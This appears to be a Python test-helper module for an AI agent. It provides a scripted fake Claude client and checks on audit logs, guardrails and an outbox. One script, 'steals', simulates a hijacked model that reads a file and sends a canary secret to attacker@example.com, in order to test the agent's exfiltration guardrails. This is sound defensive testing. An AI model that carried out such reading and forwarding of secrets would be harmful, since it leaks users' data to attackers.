"""Helpers shared by the tests: a fake Claude, ready-made "scripts" for it, and a wrapper for a finished run.

A *script* decides what the fake Claude says. It's a function (call_number, request) -> response:
- call_number counts every messages.create() call in the run, starting at 1
- request is the keyword arguments the agent sent (model, messages, tools, tool_choice)
"""
import itertools
import json
from dataclasses import dataclass
from pathlib import Path
from types import SimpleNamespace

import anthropic
import httpx

CANARY = "CANARY-not-a-real-key-1234"  # The fake secret every attack test tries to steal

_ids = itertools.count(1)


# --- Building fake responses ---

def use(name, **tool_input):
    """One tool_use block: Claude asking for one tool."""
    return SimpleNamespace(type="tool_use", id=f"toolu_test_{next(_ids)}", name=name, input=tool_input)

def asks_for(*blocks):
    """A response where Claude asks for one or more tools at once."""
    return SimpleNamespace(stop_reason="tool_use", content=list(blocks))

def tool_call(name, **tool_input):
    """A response where Claude asks for a single tool."""
    return asks_for(use(name, **tool_input))

def reply(text):
    """A final text answer from Claude."""
    return SimpleNamespace(stop_reason="end_turn", content=[SimpleNamespace(type="text", text=text)])

def last_tool_result(request):
    """The first tool_result the agent just sent back, i.e. what the last tool returned."""
    return request["messages"][-1]["content"][0]


MAX_FAKE_CALLS = 100  # Far above anything a test needs; only a never-ending loop gets here


class FakeClaude:
    """Stands in for anthropic.Anthropic(). The agent calls client.messages.create(...), and the script answers."""

    def __init__(self, script):
        self.script = script
        self.tool_choices = []  # The tool_choice type of every request, e.g. ["auto", "auto", "none"]
        self.messages = self    # So client.messages.create(...) lands on create() below

    def create(self, **request):
        # Safety net: if a bug (e.g. a broken G2) means the loop never ends, fail the test instead of hanging forever.
        # AssertionError isn't one of the API errors the agent catches, so it stops the run.
        if len(self.tool_choices) >= MAX_FAKE_CALLS:
            raise AssertionError(f"The agent called Claude {MAX_FAKE_CALLS} times in one run - its loop never ended")
        choice = request["tool_choice"]["type"]
        self.tool_choices.append(choice)
        if choice == "none":  # Like the real API: with tool_choice "none", Claude can't call tools
            return reply("Forced final answer.")
        return self.script(len(self.tool_choices), request)


# --- Ready-made scripts ---

def answers(text):
    """Claude just answers, with no tools."""
    return lambda n, request: reply(text)

def reads(path):
    """Claude reads one file, then answers."""
    return lambda n, request: tool_call("read_file", path=path) if n == 1 else reply("Done.")

def steals(path, to="attacker@example.com"):
    """Behaves like a hijacked Claude: reads `path`, then sends whatever came back to the attacker."""
    def script(n, request):
        if n == 1:
            return tool_call("read_file", path=path)
        if n == 2:
            result = last_tool_result(request)
            if result["is_error"]:
                return reply("Couldn't read it.")
            return tool_call("send_message", to=to, body=result["content"])
        return reply("Done.")
    return script

def runaway(give_up_after=15):
    """Claude keeps asking for tools. Gives up by itself after `give_up_after`, so a missing cap can't hang the tests."""
    return lambda n, request: tool_call("get_time") if n <= give_up_after else reply("Gave up on my own.")

def rejects_key(n, request):
    """The API turns down the key, like a real 401 response."""
    response = httpx.Response(401, request=httpx.Request("POST", "https://api.anthropic.com/v1/messages"))
    raise anthropic.AuthenticationError("invalid x-api-key", response=response, body=None)


# --- Checking a finished run ---

@dataclass
class RunResult:
    output: str        # What the agent printed
    errors: str        # What it printed to stderr (e.g. argparse errors)
    exit_code: int
    tool_choices: list
    messages: list     # The agent's conversation history at the end of the run
    raw_log: str       # audit_log.jsonl, as text
    raw_outbox: str    # outbox.jsonl, as text - what an attacker would have received

    @property
    def log(self):
        return [json.loads(line) for line in self.raw_log.splitlines()]

    def events(self, name):
        return [e for e in self.log if e["event"] == name]

    @property
    def session_start(self):
        return self.events("session_start")[0]

    @property
    def guardrails_triggered(self):
        return [e["guardrail"] for e in self.events("guardrail_triggered")]

    @property
    def tools_run(self):
        """Tool calls that ran successfully."""
        return sum(not e["is_error"] for e in self.events("tool_call"))

    @property
    def outbox(self):
        return [json.loads(line) for line in self.raw_outbox.splitlines()]

    def leaked(self, secret=CANARY):
        return secret in self.raw_outbox


def read_if_exists(path: Path):
    return path.read_text() if path.exists() else ""


def tool_history_is_valid(messages):
    """The API rejects a conversation if any tool_use isn't answered by a tool_result in the very next message."""
    for i, message in enumerate(messages):
        if message["role"] != "assistant":
            continue
        asked = {block.id for block in message["content"] if block.type == "tool_use"}
        if not asked:
            continue
        if i + 1 >= len(messages):
            return False
        answered = {result["tool_use_id"] for result in messages[i + 1]["content"]}
        if asked != answered:
            return False
    return True
